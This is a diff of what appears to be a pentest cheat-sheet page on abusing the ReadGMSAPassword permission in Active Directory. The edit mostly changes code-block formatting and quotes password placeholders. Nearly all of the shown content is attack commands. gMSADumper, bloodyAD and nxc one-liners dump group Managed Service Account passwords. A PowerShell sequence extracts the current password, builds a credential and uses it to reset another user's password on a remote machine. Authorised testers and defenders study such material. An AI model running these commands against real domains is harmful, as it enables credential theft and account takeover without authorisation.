@@ -4,7 +4,6 @@ date: 2024-7-23
 tags: ["ReadGMSAPassword", "gMSADumper", "active driectory", "ad", "Windows"]
 ---
 
----
 ### Abuse #1: Read GMSAPassword (From Linux)
 
 {{< tab set1 tab1 active >}}gMSADumper{{< /tab >}}
@@ -14,8 +13,8 @@ tags: ["ReadGMSAPassword", "gMSADumper", "active driectory", "ad", "Windows"]
 
 <div>
 
-```bash
-python3 gMSADumper.py -u <USER> -p <PASSWORD> -l <TARGET> -d <DOMAIN>
+```console
+python3 gMSADumper.py -u <USER> -p '<PASSWORD>' -l <TARGET> -d <DOMAIN>
 ```
 
 </div>
@@ -27,8 +26,8 @@ python3 gMSADumper.py -u <USER> -p <PASSWORD> -l <TARGET> -d <DOMAIN>
 
 <div>
 
-```bash
-python3 bloodyAD.py -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC> get object <TARGET_OBJECT> --attr msDS-ManagedPassword
+```console
+python3 bloodyAD.py -d <DOMAIN> -u <USER> -p '<PASSWORD>' --host <DC> get object <TARGET_OBJECT> --attr msDS-ManagedPassword
 ```
 
 </div>
@@ -40,8 +39,8 @@ python3 bloodyAD.py -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC> get object <
 
 <div>
 
-```bash
-nxc ldap -u <USER> -p <PASSWORD> -d <DOMAIN> <TARGET> --gmsa
+```console
+nxc ldap -u <USER> -p '<PASSWORD>' -d <DOMAIN> <TARGET> --gmsa
 ```
 
 </div>
@@ -59,27 +58,27 @@ nxc ldap -u <USER> -p <PASSWORD> -d <DOMAIN> <TARGET> --gmsa
 
 <div>
 
-```powershell
+```console
 $gmsa = Get-ADServiceAccount -Identity <TARGET_NAME> -Properties 'msDS-ManagedPassword'
 ```
 
-```powershell
+```console
 $mp = $gmsa.'msDS-ManagedPassword'
 ```
 
-```powershell
+```console
 $password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
 ```
 
-```powershell
+```console
 $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
 ```
 
-```powershell
+```console
 $cred = New-Object System.Management.Automation.PSCredential <TARGET_NAME>, $SecPass
 ```
 
-```powershell
+```console
 # For example, change password of another target user
 Invoke-Command -ComputerName <COMPUTER_NAME> -ScriptBlock {Set-ADAccountPassword -Identity <ANOTHER_TARGET_NAME> -reset -NewPassword (ConvertTo-SecureString -AsPlainText '<PASSWORD>' -force)} -Credential $cred
 ```
